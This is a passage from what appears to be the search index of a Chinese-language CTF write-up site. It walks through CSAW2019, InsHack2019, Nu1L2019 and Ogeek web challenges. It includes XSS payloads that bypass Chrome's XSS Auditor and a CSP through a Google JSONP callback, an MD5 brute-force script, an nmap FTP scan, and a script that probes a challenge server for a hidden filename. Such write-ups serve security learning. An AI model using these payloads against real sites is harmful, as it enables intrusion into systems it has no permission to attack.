= jwt . sign ({ id : item . id , price : item . price }, store . key ); return token ; }","title":"Token Format"},{"location":"writeup/CSAW2019/#store-object","text":"store \u7ed3\u6784\u662f\u8fd9\u6837\u5b50\u7684\uff1a 1 \u975e\u5e38\u5947\u602a\u7684\u4e8b\u60c5\u662f key \u8fd9\u4e2a\u5c5e\u6027\u5e76\u6ca1\u6709\u5728\u8fd9\u91cc\u5b9a\u4e49\uff0c\u4f46\u662f\u6211\u4eec\u770b\u5230 store.key \u662f\u88ab\u7528\u6765\u7f16\u7801 token \u7684 \u5728 stroe.js \u53ef\u4ee5\u627e\u5230 1 2 3 4 5 6 7 8 9 // Invalidate and resign all items function update_store () { // Create store key with long random string store . key = crypto . randomBytes ( 64 ). toString ( 'hex' ); for ( let item of store . items ) { item . token = sign_item ( item ); } } store.key = crypto.randomBytes(64).toString('hex') \u770b\u4e0a\u53bb\u662f\u65e0\u6cd5\u7834\u89e3\u7684 \u6211\u4eec\u89c2\u5bdf\u5230\uff1a 1 \u53ea\u6709\u6bcf\u6b21 new_item \u88ab\u6dfb\u52a0\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u65f6\u5019\u4e5f\u4f1a\u66f4\u65b0 key","title":"Store Object"},{"location":"writeup/CSAW2019/#what-if-we-know-the-secret-key","text":"\u5982\u679c\u6211\u4eec\u77e5\u9053 secret_key \u6211\u4eec\u5c31\u80fd\u5bf9 {'id': 'flag.flag', 'price':'1'} \u8fdb\u884c\u7b7e\u540d \u7136\u540e\u5411\u8def\u7531 /checkout \u53d1\u9001\u8bf7\u6c42 1 2 3 4 5 6 7 8 9 10 11 12 // Get an item callback function get_item ( item ) { money_count += item . price ; return items [ item . id ]; } // Create the Flag store and the Flag item stores [ create_store ( 'Flag' , 'flag' )]. create_item ( 'flag' , 100000000 , ( id , req , res )=>{ flag_count ++ ; res . send ( `Congrats! Your flag is ${ fs . readFileSync ( 'flag.txt' ). toString (). replace ( /^\\s+|\\s+$/g , '' ) } !` ); }); \u4f46\u662f\u8fd9\u91cc\u6709\u4e00\u4e2a\u9a8c\u8bc1\uff1a 1","title":"What if we know the secret key?"},{"location":"writeup/CSAW2019/#ssti","text":"\u5982\u4f55\u8bfb\u5230 store.key \u5e76\u4e14\u8986\u76d6\u8fd9\u4e2a\u503c","title":"\u91cd\u65b0\u56de\u5230SSTI"},{"location":"writeup/Inshack2019/","text":"InsHack 2019 \u00b6 BypassEverywhere | Web \u00b6 \u8fdb\u5165\u9875\u9762\u4e4b\u540e\u6709\u5f88\u591a\u4ef6\u5546\u54c1 \u6ce8\u610f\u5230 URL \u4e3a article?name=my_name&time=my_time&unit=my_unit&img=my_img&description=my_desc \u540c\u65f6\u6709\u6e90\u7801\u63d0\u4f9b\uff0c\u53d1\u73b0\u4e86\u4e00\u5904XSS \u5728 /admin \u9875\u9762\u6211\u4eec\u80fd\u53d1\u9001\u4e00\u4e2aURL\u7ed9\u7ba1\u7406\u5458\uff0c\u7ba1\u7406\u5458\u4e4b\u540e\u5c31\u4f1a\u67e5\u770b\u8fd9\u4e2aURL \u540c\u65f6\u9875\u9762\u5e95\u90e8\u6709\u63d0\u793a\uff0c\u6211\u4eec\u9700\u8981\u4ece 127.0.0.1:8080 \u8fd9\u4e2a\u9875\u9762\u8bbf\u95ee\u800c\u4e0d\u662f\u4ece\u5916\u90e8\u7684\u4e3b\u673a\u8bbf\u95ee \u6211\u4eec\u7684\u601d\u8def\u5c31\u662f\uff1a\u627e\u5230\u7f51\u7ad9\u7684\u4e00\u4e2aXSS\uff0c\u5c06\u5176\u53d1\u9001\u7ed9 admin \u7136\u540e\u6cc4\u9732\u51fa admin \u9875\u9762\u4e0b\u7684\u5185\u5bb9 \u786e\u5b9aadmin\u7684\u6d4f\u89c8\u5668 \u00b6 \u56e0\u4e3a\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u6211\u4eec\u9700\u8981\u91c7\u7528\u4e0d\u540c\u7684payload\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b65\u5148\u786e\u5b9a\u6d4f\u89c8\u5668 \u901a\u8fc7\u6293\u5305\u67e5\u770b User-agent \u9875\u9762\uff0cadmin\u4f7f\u7528\u7684\u662f headless google chrome \u5bfb\u627eXSS\u70b9 \u00b6 \u89c2\u5bdf /article \u9875\u9762\uff0c\u5f88\u660e\u663e\u6709\u4e00\u5904XSS \u6211\u4eec\u5c1d\u8bd5\u5728 time \u8fd9\u4e2a\u53c2\u6570\u6ce8\u5165\uff0c\u5374\u88ab\u963b\u62e6\u4e86 \u7ed5\u8fc7chrome\u7684XSS auditor \u00b6 \u5f88\u660e\u663e\u6211\u4eec\u53d1\u73b0payload\u88ab\u62e6\u622a\u4e86\uff0c\u8fd9\u662f Chrome \u5f15\u5165\u7684XSS Auditor \u5e78\u8fd0\u7684\u662f\u6211\u4eec\u6709\u4e24\u4e2a\u53c2\u6570\u53ef\u4ee5\u6ce8\u5165 \u4e8e\u662f\u6784\u9020 https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script>ale&unit=rt(1)</script> \u7ed5\u8fc7CSP \u00b6 \u6211\u4eec\u9700\u8981\u6cc4\u9732 /admin \u9875\u9762\u4e0b\u7684\u5185\u5bb9 \u4f46\u662f\u6709CSP\u7684\u9650\u5236\uff1a 1 \u8fd9\u4e2aCSP\u7684\u542b\u4e49\u5927\u81f4\u5c31\u662f\u53ea\u5141\u8bb8\u52a0\u8f7d\u6765\u81eagoogle.com\u7684\u811a\u672c\uff0c\u5141\u8bb8\u52a0\u8f7d\u540c\u6e90\u7684\u8d44\u6e90 \u540c\u65f6\uff0c\u7531\u4e8e\u6ca1\u6709\u5199\u660e connect-src \u7684\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u662f\u7981\u7528 XMLHttpRequest \u7684 JSONP \u00b6 JSONP\u7684\u6982\u5ff5\u5df2\u7ecf\u77e5\u9053\u4e86 \u90a3\u4e48\u5c31\u662f\u60f3\u529e\u6cd5\u627e\u4e00\u4e2agoogle\u7684\u9875\u9762\u4e86\uff0c\u5e78\u8fd0\u7684\u662f\u8fd8\u771f\u7684\u6709 https://www.google.com/complete/search?client=chrome&q=hello&callback=my_function \u901a\u8fc7\u52a0\u8f7d\u8fd9\u4e2a\u811a\u672c\u5c31\u80fd\u6267\u884c\u51fd\u6570\u4e86 \u6bd4\u5982: https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=%3Cscript/src=&unit=https://www.google.com/complete/search?client=chrome%26q=hello%26callback=alert%3E%3C/script%3E \u53ef\u89c1\u6211\u4eec\u7684 alert \u51fd\u6570\u5f97\u5230\u4e86\u6267\u884c \u6cc4\u9732 /admin \u9875\u9762 \u00b6 \u5230\u8fd9\u4e00\u6b65\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u6267\u884c\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u4e86\u4f46\u662f\u53c2\u6570\u8fd8\u4e0d\u80fd\u4f20\u9012\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u4e0d\u80fd\u7528 XMLHttpRequest \u6211\u4eec\u53d1\u73b0 /admin \u9875\u9762\u6ca1\u6709CSP\u89c4\u5219\uff1f\uff1f\uff08\u5b58\u7591 \u6240\u4ee5\u6211\u4eec\u60f3\u529e\u6cd5\u901a\u8fc7 /article \u6765\u8fbe\u5230\u5728 /admin \u9875\u9762XSS\u7684\u76ee\u7684 \u4ecb\u7ecd\u4e00\u4e0biframes\u6807\u7b7e \u00b6 \u8fd9\u4e2a\u6807\u7b7e\u5f02\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u76f4\u63a5\u8de8\u57df\u8bf7\u6c42\u4e00\u4e2a\u9875\u9762\u7684\u8d44\u6e90\uff0c\u6216\u8005\u8bf4\u662f\u4f2a\u9020\u4e00\u4e2a\u9875\u9762 \u770b\u4e00\u4e0b\u4ee3\u7801 1 2 3 < iframe name = \"frame1\" src = \"https://domain_x/page1\" ></ iframe > < iframe name = \"frame2\" src = \"https://some_random_domain\" ></ iframe > < iframe name = \"frame3\" src = \"https://domain_x/page2\" ></ iframe > \u7b2c\u4e00\u4e2a frame1 \u53ef\u4ee5\u901a\u8fc7js\u4fee\u6539 frame3 \u7684\u9875\u9762\u5185\u5bb9 1 2 // JavaScript code hosted in https://domain_x/page1 top.frame3.document.write(\"new content\") \u56e0\u4e3a frame1 \u548c frame3 \u90fd\u662f\u5904\u4e8e\u540c\u4e00\u4e2a\u6e90\u4e0b \u4f46\u662f frame2 \u4e0d\u53ef\u4ee5 \u7ed5\u8fc7CSP\uff1a\u83b7\u53d6/admin\u9875\u9762\u7684XSS \u00b6 \u53c2\u8003 \u00b6 wp","title":"InsHack 2019"},{"location":"writeup/Inshack2019/#inshack-2019","text":"","title":"InsHack 2019"},{"location":"writeup/Inshack2019/#bypasseverywhere-web","text":"\u8fdb\u5165\u9875\u9762\u4e4b\u540e\u6709\u5f88\u591a\u4ef6\u5546\u54c1 \u6ce8\u610f\u5230 URL \u4e3a article?name=my_name&time=my_time&unit=my_unit&img=my_img&description=my_desc \u540c\u65f6\u6709\u6e90\u7801\u63d0\u4f9b\uff0c\u53d1\u73b0\u4e86\u4e00\u5904XSS \u5728 /admin \u9875\u9762\u6211\u4eec\u80fd\u53d1\u9001\u4e00\u4e2aURL\u7ed9\u7ba1\u7406\u5458\uff0c\u7ba1\u7406\u5458\u4e4b\u540e\u5c31\u4f1a\u67e5\u770b\u8fd9\u4e2aURL \u540c\u65f6\u9875\u9762\u5e95\u90e8\u6709\u63d0\u793a\uff0c\u6211\u4eec\u9700\u8981\u4ece 127.0.0.1:8080 \u8fd9\u4e2a\u9875\u9762\u8bbf\u95ee\u800c\u4e0d\u662f\u4ece\u5916\u90e8\u7684\u4e3b\u673a\u8bbf\u95ee \u6211\u4eec\u7684\u601d\u8def\u5c31\u662f\uff1a\u627e\u5230\u7f51\u7ad9\u7684\u4e00\u4e2aXSS\uff0c\u5c06\u5176\u53d1\u9001\u7ed9 admin \u7136\u540e\u6cc4\u9732\u51fa admin \u9875\u9762\u4e0b\u7684\u5185\u5bb9","title":"BypassEverywhere | Web"},{"location":"writeup/Inshack2019/#admin","text":"\u56e0\u4e3a\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u6211\u4eec\u9700\u8981\u91c7\u7528\u4e0d\u540c\u7684payload\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b65\u5148\u786e\u5b9a\u6d4f\u89c8\u5668 \u901a\u8fc7\u6293\u5305\u67e5\u770b User-agent \u9875\u9762\uff0cadmin\u4f7f\u7528\u7684\u662f headless google chrome","title":"\u786e\u5b9aadmin\u7684\u6d4f\u89c8\u5668"},{"location":"writeup/Inshack2019/#xss","text":"\u89c2\u5bdf /article \u9875\u9762\uff0c\u5f88\u660e\u663e\u6709\u4e00\u5904XSS \u6211\u4eec\u5c1d\u8bd5\u5728 time \u8fd9\u4e2a\u53c2\u6570\u6ce8\u5165\uff0c\u5374\u88ab\u963b\u62e6\u4e86","title":"\u5bfb\u627eXSS\u70b9"},{"location":"writeup/Inshack2019/#chromexss-auditor","text":"\u5f88\u660e\u663e\u6211\u4eec\u53d1\u73b0payload\u88ab\u62e6\u622a\u4e86\uff0c\u8fd9\u662f Chrome \u5f15\u5165\u7684XSS Auditor \u5e78\u8fd0\u7684\u662f\u6211\u4eec\u6709\u4e24\u4e2a\u53c2\u6570\u53ef\u4ee5\u6ce8\u5165 \u4e8e\u662f\u6784\u9020 https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script>ale&unit=rt(1)</script>","title":"\u7ed5\u8fc7chrome\u7684XSS auditor"},{"location":"writeup/Inshack2019/#csp","text":"\u6211\u4eec\u9700\u8981\u6cc4\u9732 /admin \u9875\u9762\u4e0b\u7684\u5185\u5bb9 \u4f46\u662f\u6709CSP\u7684\u9650\u5236\uff1a 1 \u8fd9\u4e2aCSP\u7684\u542b\u4e49\u5927\u81f4\u5c31\u662f\u53ea\u5141\u8bb8\u52a0\u8f7d\u6765\u81eagoogle.com\u7684\u811a\u672c\uff0c\u5141\u8bb8\u52a0\u8f7d\u540c\u6e90\u7684\u8d44\u6e90 \u540c\u65f6\uff0c\u7531\u4e8e\u6ca1\u6709\u5199\u660e connect-src \u7684\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u662f\u7981\u7528 XMLHttpRequest \u7684","title":"\u7ed5\u8fc7CSP"},{"location":"writeup/Inshack2019/#jsonp","text":"JSONP\u7684\u6982\u5ff5\u5df2\u7ecf\u77e5\u9053\u4e86 \u90a3\u4e48\u5c31\u662f\u60f3\u529e\u6cd5\u627e\u4e00\u4e2agoogle\u7684\u9875\u9762\u4e86\uff0c\u5e78\u8fd0\u7684\u662f\u8fd8\u771f\u7684\u6709 https://www.google.com/complete/search?client=chrome&q=hello&callback=my_function \u901a\u8fc7\u52a0\u8f7d\u8fd9\u4e2a\u811a\u672c\u5c31\u80fd\u6267\u884c\u51fd\u6570\u4e86 \u6bd4\u5982: https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=%3Cscript/src=&unit=https://www.google.com/complete/search?client=chrome%26q=hello%26callback=alert%3E%3C/script%3E \u53ef\u89c1\u6211\u4eec\u7684 alert \u51fd\u6570\u5f97\u5230\u4e86\u6267\u884c","title":"JSONP"},{"location":"writeup/Inshack2019/#admin_1","text":"\u5230\u8fd9\u4e00\u6b65\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u6267\u884c\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u4e86\u4f46\u662f\u53c2\u6570\u8fd8\u4e0d\u80fd\u4f20\u9012\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u4e0d\u80fd\u7528 XMLHttpRequest \u6211\u4eec\u53d1\u73b0 /admin \u9875\u9762\u6ca1\u6709CSP\u89c4\u5219\uff1f\uff1f\uff08\u5b58\u7591 \u6240\u4ee5\u6211\u4eec\u60f3\u529e\u6cd5\u901a\u8fc7 /article \u6765\u8fbe\u5230\u5728 /admin \u9875\u9762XSS\u7684\u76ee\u7684","title":"\u6cc4\u9732/admin\u9875\u9762"},{"location":"writeup/Inshack2019/#iframes","text":"\u8fd9\u4e2a\u6807\u7b7e\u5f02\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u76f4\u63a5\u8de8\u57df\u8bf7\u6c42\u4e00\u4e2a\u9875\u9762\u7684\u8d44\u6e90\uff0c\u6216\u8005\u8bf4\u662f\u4f2a\u9020\u4e00\u4e2a\u9875\u9762 \u770b\u4e00\u4e0b\u4ee3\u7801 1 2 3 < iframe name = \"frame1\" src = \"https://domain_x/page1\" ></ iframe > < iframe name = \"frame2\" src = \"https://some_random_domain\" ></ iframe > < iframe name = \"frame3\" src = \"https://domain_x/page2\" ></ iframe > \u7b2c\u4e00\u4e2a frame1 \u53ef\u4ee5\u901a\u8fc7js\u4fee\u6539 frame3 \u7684\u9875\u9762\u5185\u5bb9 1 2 // JavaScript code hosted in https://domain_x/page1 top.frame3.document.write(\"new content\") \u56e0\u4e3a frame1 \u548c frame3 \u90fd\u662f\u5904\u4e8e\u540c\u4e00\u4e2a\u6e90\u4e0b \u4f46\u662f frame2 \u4e0d\u53ef\u4ee5","title":"\u4ecb\u7ecd\u4e00\u4e0biframes\u6807\u7b7e"},{"location":"writeup/Inshack2019/#cspadminxss","text":"","title":"\u7ed5\u8fc7CSP\uff1a\u83b7\u53d6/admin\u9875\u9762\u7684XSS"},{"location":"writeup/Inshack2019/#_1","text":"wp","title":"\u53c2\u8003"},{"location":"writeup/Nu1L2019/","text":"Nu1L2019 \u00b6 sql_manage | Web \u00b6 \u4fee\u6539\u4e86\u4e00\u4e0b\u811a\u672c\u80fd\u591f\u7206\u7834\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import multiprocessing from os import urandom from hashlib import md5 from urllib import quote import sys processor_number = 8 def work ( cipher ): for i in xrange ( 100 ): plain = ( urandom ( 12 ) + 'Nu1L' ) if md5 ( plain ) . hexdigest ()[: 5 ] == cipher : print plain . encode ( 'hex' ) print quote ( plain )[: - 4 ] sys . exit ( 0 ) if __name__ == '__main__' : cipher = raw_input ( 'md5:' ) print 'Processor Number:' , multiprocessing . cpu_count () pool = multiprocessing . Pool ( processes = processor_number ) while True : plain = ( urandom ( 12 ) + 'Nu1L' ) pool . apply_async ( work , ( cipher , )) pool . close () pool . join () \u80fd\u591f\u7206\u7834\u4e86\u4f46\u662f\u8fd8\u662f\u6ca1\u80fd\u901a\u8fc7\u9a8c\u8bc1 \u5176\u4e2d\u4e00\u4e2a 1 2 3 4 5 >>> a = 'ea9c8a7f27f1aae759560e354e75314c' >>> len(a) 32 >>> a.decode('hex') \"\\xea\\x9c\\x8a\\x7f'\\xf1\\xaa\\xe7YV\\x0e5Nu1L\" \u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u663e\u7136\u6ca1\u6cd5\u53d1\u9001\u51fa\u53bb\u3002\u3002 \u8fd8\u662f\u5f97\u9760\u811a\u672c ip2long \u5c06IPV4 \u7684\u5b57\u7b26\u4e32\u4e92\u8054\u7f51\u534f\u8bae\u8f6c\u6362\u6210\u957f\u6574\u578b\u6570\u5b57 \u7eaa\u5ff5\u4e00\u4e0b\u7ec8\u4e8e\u6210\u529f\u5730\u6267\u884c\u4e86\u547d\u4ee4 select * from Nu1L \u7684\u5185\u5bb9\uff1a 1 show tables 1 [[\"Nu1L\"]] show databases 1 [[\"information_schema\"],[\"Nu1L\"]] select @@version 1 [[\"5.6.16-1~exp1\"]] system \u547d\u4ee4\u4e0d\u80fd\u6267\u884c\uff1f Pentest N1ctf2019.lab(step1) | Web \u00b6 \u8fd9\u9898\u5f88\u795e\u5947\uff1f \u6211\u7528 nmap \u626b\u63cf\u4e86\u5f88\u4e45\u90fd\u6ca1\u6709\u53d1\u73b0\u51fa\u4e86\u4ec0\u4e48\u95ee\u9898\uff0c\u4f46\u662f\u961f\u53cb\u8bf4ftp\u53ef\u4ee5\u533f\u540d\u767b\u9646 1 2 3 4 5 6 7 8 9 $ nmap --script ftp-anon -p21,22,80 47.52.129.242 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-07 19:08 EDT Nmap scan report for 47.52.129.242 Host is up (0.14s latency). PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http \u7b97\u662f\u79ef\u7d2f\u4e00\u4e0b nmap \u7684\u7528\u6cd5\uff0c\u53ef\u4ee5\u4f7f\u7528 --script \u53c2\u6570 \u4e0d\u8001\u7684\u795e\u5947\u56fd\u5149","title":"Nu1L2019"},{"location":"writeup/Nu1L2019/#nu1l2019","text":"","title":"Nu1L2019"},{"location":"writeup/Nu1L2019/#sql_manage-web","text":"\u4fee\u6539\u4e86\u4e00\u4e0b\u811a\u672c\u80fd\u591f\u7206\u7834\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import multiprocessing from os import urandom from hashlib import md5 from urllib import quote import sys processor_number = 8 def work ( cipher ): for i in xrange ( 100 ): plain = ( urandom ( 12 ) + 'Nu1L' ) if md5 ( plain ) . hexdigest ()[: 5 ] == cipher : print plain . encode ( 'hex' ) print quote ( plain )[: - 4 ] sys . exit ( 0 ) if __name__ == '__main__' : cipher = raw_input ( 'md5:' ) print 'Processor Number:' , multiprocessing . cpu_count () pool = multiprocessing . Pool ( processes = processor_number ) while True : plain = ( urandom ( 12 ) + 'Nu1L' ) pool . apply_async ( work , ( cipher , )) pool . close () pool . join () \u80fd\u591f\u7206\u7834\u4e86\u4f46\u662f\u8fd8\u662f\u6ca1\u80fd\u901a\u8fc7\u9a8c\u8bc1 \u5176\u4e2d\u4e00\u4e2a 1 2 3 4 5 >>> a = 'ea9c8a7f27f1aae759560e354e75314c' >>> len(a) 32 >>> a.decode('hex') \"\\xea\\x9c\\x8a\\x7f'\\xf1\\xaa\\xe7YV\\x0e5Nu1L\" \u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u663e\u7136\u6ca1\u6cd5\u53d1\u9001\u51fa\u53bb\u3002\u3002 \u8fd8\u662f\u5f97\u9760\u811a\u672c ip2long \u5c06IPV4 \u7684\u5b57\u7b26\u4e32\u4e92\u8054\u7f51\u534f\u8bae\u8f6c\u6362\u6210\u957f\u6574\u578b\u6570\u5b57 \u7eaa\u5ff5\u4e00\u4e0b\u7ec8\u4e8e\u6210\u529f\u5730\u6267\u884c\u4e86\u547d\u4ee4 select * from Nu1L \u7684\u5185\u5bb9\uff1a 1 show tables 1 [[\"Nu1L\"]] show databases 1 [[\"information_schema\"],[\"Nu1L\"]] select @@version 1 [[\"5.6.16-1~exp1\"]] system \u547d\u4ee4\u4e0d\u80fd\u6267\u884c\uff1f","title":"sql_manage | Web"},{"location":"writeup/Nu1L2019/#pentest-n1ctf2019labstep1-web","text":"\u8fd9\u9898\u5f88\u795e\u5947\uff1f \u6211\u7528 nmap \u626b\u63cf\u4e86\u5f88\u4e45\u90fd\u6ca1\u6709\u53d1\u73b0\u51fa\u4e86\u4ec0\u4e48\u95ee\u9898\uff0c\u4f46\u662f\u961f\u53cb\u8bf4ftp\u53ef\u4ee5\u533f\u540d\u767b\u9646 1 2 3 4 5 6 7 8 9 $ nmap --script ftp-anon -p21,22,80 47.52.129.242 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-07 19:08 EDT Nmap scan report for 47.52.129.242 Host is up (0.14s latency). PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http \u7b97\u662f\u79ef\u7d2f\u4e00\u4e0b nmap \u7684\u7528\u6cd5\uff0c\u53ef\u4ee5\u4f7f\u7528 --script \u53c2\u6570 \u4e0d\u8001\u7684\u795e\u5947\u56fd\u5149","title":"Pentest N1ctf2019.lab(step1) | Web"},{"location":"writeup/Ogeek/","text":"Ogeek \u00b6 Web \u00b6 Enjoy your self \u00b6 \u6253\u5f00\u4e4b\u540e\u662f\u8fd9\u6837\u4e00\u4e2a\u9875\u9762\uff0c\u63d0\u793a time is money \u731c\u6d4b\u662f\u7ade\u4e89 \u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 <center><img src=\"../../welcome.png\"></center> <br/> <br/> <?php error_reporting ( 0 ); include \"../../utils/utils.php\" ; if ( isset ( $_REQUEST [ 'filename' ]) and preg_match ( \"/^\\w{8}$/\" , $_REQUEST [ 'filename' ])){ $filename = strtolower ( $_REQUEST [ 'filename' ]); touch ( \"backup/ { $filename } .txt\" ); unlink ( glob ( \"backup/*\" )[ 0 ]); } else { highlight_file ( __FILE__ ); } ?> \\w \u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u7b49\u540c\u4e8e [a-zA-Z0-9_] \u6240\u4ee5\u6b64\u5904\u6b63\u5219\u7684\u542b\u4e49\u5c31\u662f\u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u5f00\u5934\u7684\u6587\u4ef6\u540d\u3002 touch \u4f1a\u91cd\u65b0\u8bbe\u5b9a\u6587\u4ef6\u7684\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\uff0c\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa\u3002 unlink \u51fd\u6570\u5220\u9664\u6587\u4ef6\uff0c\u6210\u529f\u65f6\u8fd4\u56de TRUE \uff0c \u6216\u8005\u5728\u5931\u8d25\u65f6\u8fd4\u56de FALSE \u3002 glob \u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u6700\u540e\u4e00\u53e5 unlink(glob(\"backup/*\")[0]); \u5f88\u5173\u952e\uff0c\u4f60\u9700\u8981\u77e5\u9053 glob \u5217\u51fa\u7684\u6587\u4ef6\u987a\u5e8f\u662f\u600e\u6837\u7684\uff0c\u8fd9\u91cc\u8981\u8c03\u8bd5\u4e00\u4e0b \u8fd9\u91cc\u5148\u68c0\u67e5\u4e86 filename \u662f\u4e0d\u662f\u516b\u4f4d \u5927\u5c0f\u5199\u5b57\u6bcd\u6216\u8005\u6570\u5b57\u6216\u8005\u4e0b\u5212\u7ebf\u3002\u662f\u7684\u8bdd\u5c31\u521b\u5efa\u4e00\u4e2a\u8fd9\u4e2a\u540d\u5b57\u7684\u6587\u4ef6\u3002\u7136\u540e\u518d\u5217\u6587\u4ef6\uff0c\u5220\u9664\u5217\u51fa\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\u3002\u8fd9\u91cc\u6709\u4e2a\u6709\u610f\u601d\u7684\u5730\u65b9\uff0c\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u8981\u662f\u5b58\u5728\u5176\u4ed6\u6587\u4ef6\uff0c\u90a3\u5217\u51fa\u6765\u7684\u5c31\u662f\u90a3\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u7684\u6587\u4ef6\u5c31\u4e0d\u4f1a\u88ab\u5220\u4e86\uff0c\u5c31\u6b64\u90a3\u5c31\u53ef\u4ee5\u63a8\u6d4b\u51fa\u90a3\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u4e86\u3002 \u6211\u4eec\u5728\u672c\u5730\u505a\u4e2a\u5b9e\u9a8c\uff0c\u6765\u5c55\u793a\u4e00\u4e0b\u6211\u4eec\u8981\u5220\u9664\u7684\u6587\u4ef6\u3002 \u7136\u540e\u5728 backup \u4e0b\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c31\u53eb abcdabcd \u5427\u3002 \u7136\u540e\u8bbf\u95ee\u8bd5\u8bd5 /?filename=abcdabcd\u3002 \u8fd9\u4e2a\u6587\u4ef6\u88ab\u5220\u4e86\uff0c\u4f46\u7a0b\u5e8f\u521b\u5efa\u7684abcdabcd.txt \u8fd8\u5b58\u5728\u3002 \u5728\u8fd9\u4e2a\u57fa\u7840\u4e0a\u5199\u4e2a\u811a\u672c\uff0c\u6765\u73a9\u73a9\u4eba\u8089\u4e8c\u5206\u6cd5\u5427\u3002 1 2 3 4 5 6 7 8 9 10 11 import requests filename = \"zzzzzzzz\" while True : print ( requests . get ( \"http://47.107.255.20:18088/users/977acc6365a9bc4f1c56accf1331a3bb/\" , params = { \"filename\" : filename }) . text ) r = requests . get ( \"http://47.107.255.20:18088/users/ 977acc6365a9bc4f1c56accf1331a3bb/backup/\" + filename + \".txt\" ) print ( r . status_code ) if r . status_code != 404 : print ( filename ) exit ( 0 ) \u4ece\u53ef\u7528\u5b57\u7b26\u7684\u6700\u540e\u4e00\u4f4d\u5f00\u59cb\u3002\u6d4b\u4e86\u4e0b\u670d\u52a1\u5668\u4f3c\u4e4e\u662f\u6709\u5b9a\u65f6\u91cd\u7f6e\u8fd8\u662f\u5565\u7684\u3002\u6240\u4ee5\u9700\u8981\u591a\u6b21\u5c1d\u8bd5\uff0c\u6709\u4e00\u6b21 200 \u5c31\u8bf4\u660e\u90a3\u4e2a\u6587\u4ef6\u7684\u5b57\u5178\u5e8f\u5728\u524d\u9762\u4e86\u3002 azzzzzzz\u8fd4\u56de 200\uff0c\u8bf4\u660e\u6587\u4ef6\u8fd8\u5728\u524d\u9762\u3002 \u5982\u6b64\u5f80\u590d\uff0c\u8dd1\u51fa\u524d\u4e03\u4f4d\u5b57\u7b26 aefebab\u3002\u7701\u7565\u3002\u3002\u3002\u90a3\u5c31\u8bf4\u660e\u6587\u4ef6\u540d\u662f aefebab8 \u4e86\u3002\u6253\u5f00\u770b\u770b\uff0c\u679c\u7136\u6709\u4e1c\u897f\u3002 \u8bbf\u95ee\u4e4b\u540e\u6709\u4e1c\u897f\uff1a \u53c2\u8003\u5e08\u5085\u7684\u597d\u4e86\u73af\u5883\u6ca1\u4e862333 Look around \u00b6 \u663e\u793a\u65f6\u95f4 \u6e90\u4ee3\u7801\u4e2d\u6709 js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 setInterval ( jishi , 1000 ); function jishi (){ var iTime = new Date (); var iYear = iTime . getFullYear (); var iMonth = iTime . getMonth (); var iDate = iTime . getDate (); var iDay = iTime . getDay (); var iHour = iTime . getHours (); var iMinute = iTime . getMinutes (); var iSecond = iTime . getSeconds (); var aPic = document . getElementsByClassName ( 'timePic' ); if ( iDay == '0' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e6\u2014\u00a5' ; } else if ( iDay == '1' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u20ac' ; } else if ( iDay == '2' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u0152' ; } else if ( iDay == '3' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u2030' ; } else if ( iDay == '4' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u203a\u203a' ; } else if ( iDay == '5' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u201d' ; } else { iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u2026\u00ad' ; } var strNew = ChangeTime ( iHour ) + '' + ChangeTime ( iMinute ) + '' + ChangeTime ( iSecond ); //\u00e8\u00bd\u00ac\u00e6\u008d\u00a2\u00e4\u00b8\u00ba\u00e5\u00ad\u2014\u00e7\u00ac\u00a6\u00e4\u00b8\u00b2 for ( var i = 0 ; i < 6 ; i ++ ){ aPic [ i ]. src = 'img/' + strNew . charAt ( i ) + 